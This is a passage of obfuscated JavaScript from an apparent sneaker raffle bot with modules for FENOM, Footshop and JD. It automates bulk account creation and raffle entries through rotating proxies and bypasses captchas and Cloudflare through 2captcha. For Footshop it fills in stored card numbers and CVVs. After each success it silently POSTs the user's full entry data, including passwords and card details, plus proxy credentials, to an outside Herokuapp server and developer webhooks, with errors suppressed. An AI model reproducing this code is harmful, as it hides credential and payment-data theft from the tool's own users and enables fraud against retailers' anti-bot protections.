                            console['log'](_0x1500d7() + '\x20[' + _0x436143['name'] + ']\x20Task\x20' + (_0x22e57f + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x54420b['type']('input[name=\x22firstname\x22]', '' + _0x43db3a[_0x22e57f]['FirstName']), await _0x9175f4(0x1f4), await _0x54420b['type']('input[name=\x22lastname\x22]', '' + _0x43db3a[_0x22e57f]['LastName']), await _0x9175f4(0x1f4), await _0x54420b['type']('input[name=\x22email\x22]', '' + _0x43db3a[_0x22e57f]['Email']), await _0x9175f4(0x1f4), await _0x54420b['type']('input[name=\x22password\x22]', '' + _0x43db3a[_0x22e57f]['Password']), await _0x9175f4(0x258), await _0x54420b['$eval']('input[name=\x22psgdpr\x22]', _0x4e408c => _0x4e408c['click']()), await _0x9175f4(0x1f4), console['log'](_0x1500d7() + '\x20[' + _0x436143['name'] + ']\x20Task\x20' + (_0x22e57f + 0x1) + '\x20:\x20Sending\x20Request'), await _0x54420b['$eval']('#customer-form', _0x4a7a31 => _0x4a7a31['submit']());
                            try {
                                try {
                                    await _0x54420b['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x57332e = 'no', console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x436143['name'] + ']\x20Task\x20' + (_0x22e57f + 0x1) + '\x20:\x20Account\x20' + _0x43db3a[_0x22e57f]['Email'] + '\x20Generated')), _0x1ed524['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x43db3a[_0x22e57f]['Email'] + ',' + _0x43db3a[_0x22e57f]['Password']);
                                let _0x234b14 = _0x43db3a[_0x22e57f];
                                try {
                                    prxdata = {
                                        'username': _0x100f6f['replace']('#', ''),
                                        'module': _0x436143['name'],
                                        'entrydata': JSON['stringify'](_0x234b14),
                                        'proxy': '' + _0x5ebe3a[_0x22e57f]
                                    };
                                    var _0x5370e0 = JSON['stringify'](prxdata);
                                    let _0x5cff0a = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x5370e0, _0x5cff0a);
                                } catch (_0x171ae5) {
                                }
                                try {
                                    _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x4f7fee['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1cac9f(_0x515b29, _0x4f7fee['succesDEVMSG']);
                            } catch (_0x1a91d8) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0xa48679) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x436143['name'] + ']\x20Task\x20' + (_0x22e57f + 0x1) + '\x20:\x20' + _0xa48679)), _0xff653d = '' + _0xa48679;
                            var _0x4a016f = await _0x22ebf6(_0x43db3a[_0x22e57f], _0x436143, 'acc', !![], _0xff653d);
                            _0x4f7fee['errorDEV'] = { 'embeds': [_0x4a016f] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x4f7fee['errorDEV']), await _0x1cac9f(_0x569bf6, _0x4f7fee['errorDEV']), _0x57332e = 'yes';
                        } finally {
                            _0x27d3ff['close']();
                            if (_0x57332e == 'yes' && _0x51cdc2 != 0x5 && _0xff653d != 'Size\x20Not\x20Found') {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x436143['name'] + ']\x20Task\x20' + (_0x22e57f + 0x1) + '\x20:\x20Retrying\x20(' + _0x51cdc2 + '\x20/\x205)')), _0x22e57f = _0x22e57f - 0x1, _0x51cdc2 = _0x51cdc2 + 0x1;
                                continue;
                            }
                            _0x57332e == 'yes' && _0x51cdc2 >= 0x5 && (_0x194f3c(_0x43db3a[_0x22e57f], _0x436143), _0x57332e = 'no', _0x51cdc2 = 0x0), console['log'](_0x1500d7() + '\x20[' + _0x436143['name'] + ']\x20Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x23ecc0(_0x5e6fc8, _0x4752a0, _0x26b13a) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x56ab34 = 0x0; _0x56ab34 < _0x4752a0['length']; _0x56ab34++) {
                        if (_0xc91595 != 'yes')
                            var _0xc91595 = '', _0x2b7289 = 0x0;
                        var _0x4ae519;
                        try {
                            await _0x5c0aeb(_0x4752a0, _0x56ab34);
                        } catch {
                            _0xc91595 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x73a448(_0x5e6fc8['name'] + '\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20/\x20' + _0x4752a0['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        const _0x5a55df = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x32e724 = Math['round'](Math['random']() * (_0x26b13a['length'] - 0x1)), _0x3673d4 = _0x26b13a[_0x32e724]['split'](':'), _0x4b0075;
                        try {
                            _0x4b0075 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3673d4[0x0] + ':' + _0x3673d4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4b0075 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3673d4[0x0] + ':' + _0x3673d4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x61f020 = await _0x4b0075['newPage'](), _0x28e49f = await _0x61f020['target']()['createCDPSession'](), { windowId: _0xfd331 } = await _0x28e49f['send']('Browser.getWindowForTarget');
                            await _0x61f020['authenticate']({
                                'username': '' + _0x3673d4[0x2],
                                'password': '' + _0x3673d4[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x61f020['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x9175f4(0xbb8), await _0x28e49f['send']('Browser.setWindowBounds', {
                                'windowId': _0xfd331,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x9175f4(0x1f40);
                            try {
                                await _0x61f020['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x9175f4(0x1388), console['log'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20Logging\x20in'), await _0x61f020['type']('input[name=\x22email\x22]', '' + _0x4752a0[_0x56ab34]['Email']), await _0x9175f4(0x1f4), await _0x61f020['type']('input[name=\x22password\x22]', '' + _0x4752a0[_0x56ab34]['Password']), await _0x9175f4(0x258), await _0x61f020['$eval']('#login-form', _0x1ac560 => _0x1ac560['submit']()), await _0x61f020['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x9175f4(0x1f4), await _0x61f020['goto']('' + _0x4752a0[_0x56ab34]['Url']), await _0x61f020['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4752a0[_0x56ab34]['Size']);
                            if (_0x4752a0[_0x56ab34]['Size'] != 'RANDOM') {
                                var _0x222f4b = '\x20' + _0x4752a0[_0x56ab34]['Size'] + '\x20';
                                const _0x43d15f = await _0x61f020['$x']('//span[contains(text(),\x20' + _0x222f4b + ')]');
                                await _0x43d15f[0x0]['click']();
                            } else {
                                const _0x58fafd = await _0x61f020['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x218167 = Math['round'](Math['random']() * (_0x58fafd['length'] - 0x1));
                                await _0x58fafd[_0x218167]['click']();
                            }
                            await _0x9175f4(0x258), await _0x61f020['click']('#cookieChoiceDismiss'), await _0x9175f4(0x3e8), await _0x61f020['type']('#instagram-account', '' + _0x4752a0[_0x56ab34]['Follower']), await _0x9175f4(0x28a), await _0x61f020['click']('#book-btn'), await _0x9175f4(0xbb8);
                            try {
                                await _0x61f020['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x9175f4(0x1f4), console['log'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20' + _0x561058['cyan']('Solving\x20Captcha')), await _0x61f020['solveRecaptchas'](), console['log'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x9175f4(0x7d0), await _0x61f020['$eval']('#book-btn-for-sure', _0x41102b => _0x41102b['click']()), await _0x9175f4(0x12c), await _0x61f020['click']('#book-btn-for-sure'), await _0x9175f4(0xdac);
                            const _0x241d3f = await _0x61f020['$eval']('.reservation-popup\x20>\x20.title', _0x1cd1cd => {
                                return _0x1cd1cd['innerHTML'];
                            });
                            if (_0x241d3f) {
                                _0xc91595 = 'no', _0x3e2f6d(_0x4752a0[_0x56ab34], _0x5e6fc8), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x11d984 = await _0x22ebf6(_0x4752a0[_0x56ab34], _0x5e6fc8, 'dev', ![]), _0x6db23d = await _0x22ebf6(_0x4752a0[_0x56ab34], _0x5e6fc8, 'pub', ![]);
                                let _0xc4251d = _0x4752a0[_0x56ab34];
                                try {
                                    prxdata = {
                                        'username': _0x100f6f['replace']('#', ''),
                                        'module': _0x5e6fc8['name'],
                                        'entrydata': JSON['stringify'](_0xc4251d),
                                        'proxy': '' + _0x26b13a[_0x56ab34]
                                    };
                                    var _0x81d099 = JSON['stringify'](prxdata);
                                    let _0x2d18e8 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x81d099, _0x2d18e8);
                                } catch (_0x117b11) {
                                }
                                const _0x2be8fe = {
                                    'succesDEVMSG': { 'embeds': [_0x11d984] },
                                    'succesPUBMSG': { 'embeds': [_0x6db23d] }
                                };
                                try {
                                    _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x2be8fe['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x2be8fe['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x2f03c2, _0x2be8fe['succesPUBMSG']);
                                } catch (_0x249ac5) {
                                    console['log'](_0x561058['yellow'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x249ac5));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x49ee8d) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20' + _0x49ee8d)), _0x4ae519 = '' + _0x49ee8d;
                            var _0x1a477a = await _0x22ebf6(_0x4752a0[_0x56ab34], _0x5e6fc8, 'dev', !![], _0x4ae519), _0x11d984 = await _0x22ebf6(_0x4752a0[_0x56ab34], _0x5e6fc8, 'dev', ![]), _0x6db23d = await _0x22ebf6(_0x4752a0[_0x56ab34], _0x5e6fc8, 'pub', ![]);
                            const _0x19b6b6 = {
                                'succesDEVMSG': { 'embeds': [_0x11d984] },
                                'succesPUBMSG': { 'embeds': [_0x6db23d] }
                            };
                            _0x19b6b6['errorDEV'] = { 'embeds': [_0x1a477a] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x19b6b6['errorDEV']), await _0x1cac9f(_0x569bf6, _0x19b6b6['errorDEV']), _0x49ee8d != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xc91595 = 'yes');
                        } finally {
                            _0x4b0075['close']();
                            if (_0xc91595 == 'yes' && _0x2b7289 != 0x5 && _0x4ae519 != 'Size\x20Not\x20Found') {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Task\x20' + (_0x56ab34 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2b7289 + '\x20/\x205)')), _0x56ab34 = _0x56ab34 - 0x1, _0x2b7289 = _0x2b7289 + 0x1;
                                continue;
                            }
                            _0xc91595 == 'yes' && _0x2b7289 >= 0x5 && (_0x194f3c(_0x4752a0[_0x56ab34], _0x5e6fc8), _0xc91595 = 'no', _0x2b7289 = 0x0), console['log'](_0x1500d7() + '\x20[' + _0x5e6fc8['name'] + ']\x20Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x677e0d, _0x23d67e, _0x49f578) {
                _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x263298['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x14fcd2 = 0x0; _0x14fcd2 < _0x23d67e['length']; _0x14fcd2++) {
                    var _0x3105c2;
                    if (_0x25a8b6 != 'yes')
                        var _0x25a8b6 = '', _0x56720f = 0x0;
                    var _0x3697b5 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x100f6f
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x23d67e[_0x14fcd2]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x23d67e[_0x14fcd2]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x263298['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5ab5b1
                            }
                        ]
                    }], _0xcf2e08 = await _0x22ebf6(_0x23d67e[_0x14fcd2], _0x677e0d, 'dev', ![]), _0x4d9004 = await _0x22ebf6(_0x23d67e[_0x14fcd2], _0x677e0d, 'pub', ![]);
                    const _0x46af26 = {
                        'succesDEVMSG': { 'embeds': [_0xcf2e08] },
                        'succesPUBMSG': { 'embeds': [_0x4d9004] }
                    }, _0x8c4420 = { 'embeds': _0x3697b5 };
                    try {
                        await _0x5c0aeb(_0x23d67e, _0x14fcd2);
                    } catch {
                        _0x25a8b6 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x23d67e[_0x14fcd2]['Email'] == '' || _0x23d67e[_0x14fcd2]['FirstName'] == '' || _0x23d67e[_0x14fcd2]['LastName'] == '' || _0x23d67e[_0x14fcd2]['Country'] == '' || _0x23d67e[_0x14fcd2]['Size'] == '' || _0x23d67e[_0x14fcd2]['Address1'] == '' || _0x23d67e[_0x14fcd2]['Zip'] == '') {
                        console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x23d67e[_0x14fcd2]['Email'] == '' || _0x23d67e[_0x14fcd2]['FirstName'] == '' || _0x23d67e[_0x14fcd2]['LastName'] == '' || _0x23d67e[_0x14fcd2]['Country'] == '' || _0x23d67e[_0x14fcd2]['Size'] == '' || _0x23d67e[_0x14fcd2]['Address1'] == '' || _0x23d67e[_0x14fcd2]['Zip'] == '' || _0x23d67e[_0x14fcd2]['Phone'] == '') {
                        console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x94646d = '' + _0x23d67e[_0x14fcd2]['Url'];
                    if (_0x263298['useRandomProxy'] = ![])
                        var _0x3e26ec = _0x49f578[_0x14fcd2]['split'](':');
                    else
                        var _0x24a8ae = Math['round'](Math['random']() * (_0x49f578['length'] - 0x1)), _0x3e26ec = _0x49f578[_0x24a8ae]['split'](':');
                    var _0x150d80;
                    try {
                        _0x150d80 = await _0x45f1d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3e26ec[0x0] + ':' + _0x3e26ec[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x150d80 = await _0x45f1d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3e26ec[0x0] + ':' + _0x3e26ec[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0xac101 = await _0x150d80['newPage']();
                        await _0xac101['authenticate']({
                            'username': '' + _0x3e26ec[0x2],
                            'password': '' + _0x3e26ec[0x3]
                        }), console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xac101['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xac101['setRequestInterception'](!![]), _0xac101['on']('request', _0x422244 => {
                            _0x422244['resourceType']() === 'image' || _0x422244['resourceType']() === 'font' || _0x422244['resourceType']() === 'media' ? _0x422244['abort']() : _0x422244['continue']();
                        });
                        try {
                            await _0xac101['goto'](_0x94646d), await _0x9175f4(0xbb8), await _0xac101['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xac101['click']('.control__JhutY'), await _0x9175f4(0x1f4);
                        if (_0x23d67e[_0x14fcd2]['Size'] != 'RANDOM')
                            try {
                                const _0x181e84 = await _0xac101['$x']('//div[contains(text(),\x20\x27' + _0x23d67e[_0x14fcd2]['Size'] + '\x27)]');
                                await _0x181e84[0x0]['click']();
                            } catch {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x39f15b = await _0xac101['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x33fadc = Math['round'](Math['random']() * (_0x39f15b['length'] - 0x1));
                            await _0x39f15b[_0x33fadc]['click']();
                        }
                        await _0x9175f4(0x4b0);
                        const _0x5c9d7b = await _0xac101['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x5c9d7b[0x0]['click'](), await _0xac101['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0xac101['type']('input[name=\x22email\x22]', '' + _0x23d67e[_0x14fcd2]['Email']), await _0x9175f4(0x640), await _0xac101['type']('input[name=\x22phone\x22]', '' + _0x23d67e[_0x14fcd2]['Phone']), await _0x9175f4(0x4b0), await _0xac101['click']('button.btn.continue-button__1RtsS'), await _0x9175f4(0x4b0);
                        try {
                            await _0xac101['type']('input[name=\x22firstName\x22]', '' + _0x23d67e[_0x14fcd2]['FirstName']), await _0x9175f4(0x258);
                        } catch {
                            const _0x186234 = await _0xac101['$$eval']('.invalid-feedback\x20>\x20div', _0x2bbd2a => {
                                return _0x2bbd2a['map'](_0xceff0 => _0xceff0['innerText']);
                            });
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20' + _0x186234));
                            continue;
                        }
                        await _0xac101['type']('input[name=\x22lastName\x22]', '' + _0x23d67e[_0x14fcd2]['LastName']), await _0x9175f4(0xc8), await _0xac101['type']('input[name=\x22instagramUsername\x22]', '' + _0x23d67e[_0x14fcd2]['Follower']), await _0x9175f4(0x4b0), await _0xac101['click']('button.btn.continue-button__1RtsS'), await _0x9175f4(0x3e8), console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0xac101['select']('select[name=\x22country\x22]', '' + _0x23d67e[_0x14fcd2]['Country']), await _0x9175f4(0x2bc), await _0xac101['type']('input[name=\x22streetName\x22]', '' + _0x23d67e[_0x14fcd2]['Address1']), await _0x9175f4(0x258), await _0xac101['type']('input[name=\x22houseNumber\x22]', _0x23d67e[_0x14fcd2]['HouseNumber'] + '\x20' + _0x23d67e[_0x14fcd2]['Address2']), await _0x9175f4(0xc8), await _0xac101['type']('input[name=\x22postalCode\x22]', '' + _0x23d67e[_0x14fcd2]['Zip']), await _0x9175f4(0x1f4), await _0xac101['type']('input[name=\x22city\x22]', '' + _0x23d67e[_0x14fcd2]['City']), await _0x9175f4(0x4b0), await _0xac101['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x9175f4(0x4b0), await _0xac101['click']('button.btn.continue-button__1RtsS'), await _0x9175f4(0x4b0), console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0xac101['solveRecaptchas'](), console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x9175f4(0xbb8), await _0xac101['click']('button.btn.continue-button__1RtsS'), await _0x9175f4(0x1388), console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xac101['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xac101['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x9175f4(0x4b0), await _0xac101['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x23d67e[_0x14fcd2]['CardNumber']), await _0x9175f4(0x320), await _0xac101['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xac101['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x23d67e[_0x14fcd2]['ExpiryDate']), await _0x9175f4(0x4b0), await _0xac101['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xac101['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x23d67e[_0x14fcd2]['CVV']), await _0x9175f4(0x226), await _0xac101['type']('input[name=\x22holderName\x22]', '' + _0x23d67e[_0x14fcd2]['NameOnCard']), await _0x9175f4(0x226), await _0xac101['click']('button.adyen-checkout__button'), console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0xac101['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x9175f4(0xbb8);
                        } catch (_0xd7acfd) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x203DS\x20Failed')), _0x3105c2 = '3DS\x20Error\x20' + _0xd7acfd;
                            var _0x28cf68 = await _0x22ebf6(_0x23d67e[_0x14fcd2], _0x677e0d, 'dev', !![], _0x3105c2);
                            _0x46af26['errorDEV'] = { 'embeds': [_0x28cf68] };
                            _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x46af26['errorDEV']);
                            await _0x1cac9f(_0x569bf6, _0x46af26['errorDEV']);
                            continue;
                        }
                        _0x3e2f6d(_0x23d67e[_0x14fcd2], _0x677e0d), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x5a47c8 = _0x23d67e[_0x14fcd2];
                        try {
                            prxdata = {
                                'username': _0x100f6f['replace']('#', ''),
                                'module': _0x677e0d['name'],
                                'entrydata': JSON['stringify'](_0x5a47c8),
                                'proxy': '' + _0x49f578[_0x14fcd2]
                            };
                            var _0x2134f3 = JSON['stringify'](prxdata);
                            let _0x3046f5 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x2134f3, _0x3046f5);
                        } catch (_0x131ca1) {
                        }
                        if (_0x263298['webhook'] != undefined && _0x263298['webhook'] != '')
                            try {
                                await _0x1cac9f(_0x263298['webhook'], _0x46af26['succesDEVMSG']);
                            } catch {
                            }
                        await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x46af26['succesDEVMSG']), await _0x9175f4(0xc8);
                        try {
                            await _0x1cac9f(_0x2f03c2, _0x46af26['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x59b8f5) {
                        console['log'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20' + _0x59b8f5), _0x3105c2 = '' + _0x59b8f5;
                        var _0x28cf68 = await _0x22ebf6(_0x23d67e[_0x14fcd2], _0x677e0d, 'dev', !![], _0x3105c2);
                        _0x46af26['errorDEV'] = { 'embeds': [_0x28cf68] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x46af26['errorDEV']), await _0x1cac9f(_0x569bf6, _0x46af26['errorDEV']), _0x25a8b6 = 'yes';
                    } finally {
                        _0x150d80['close']();
                        if (_0x25a8b6 == 'yes' && _0x56720f != 0x5) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x677e0d['name'] + ']\x20Task\x20' + (_0x14fcd2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x56720f + '\x20/\x205)')), _0x14fcd2 = _0x14fcd2 - 0x1, _0x56720f = _0x56720f + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x263298['footshopDelay'] + '\x20ms'), await _0x9175f4(_0x263298['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x3ac31f, _0x51a35f, _0x39ab95) {
                var _0x1ddfd6 = ![], _0x1604ef = ![];
                if (_0x263298['captchaKey'] == '' || _0x263298['captchaKey'] == undefined)
                    return console['log'](_0x561058['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x263298['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5cb42a = 0x0; _0x5cb42a < _0x51a35f['length']; _0x5cb42a++) {
                    if (_0x123a18 != 'yes')
                        var _0x123a18 = '', _0x13de2b = 0x0;
                    var _0x17b796, _0x20b277 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x51a35f[_0x5cb42a]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x51a35f[_0x5cb42a]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x100f6f
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x263298['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5ab5b1
                            }
                        ]
                    }];
                    const _0x2c7437 = { 'embeds': _0x20b277 };
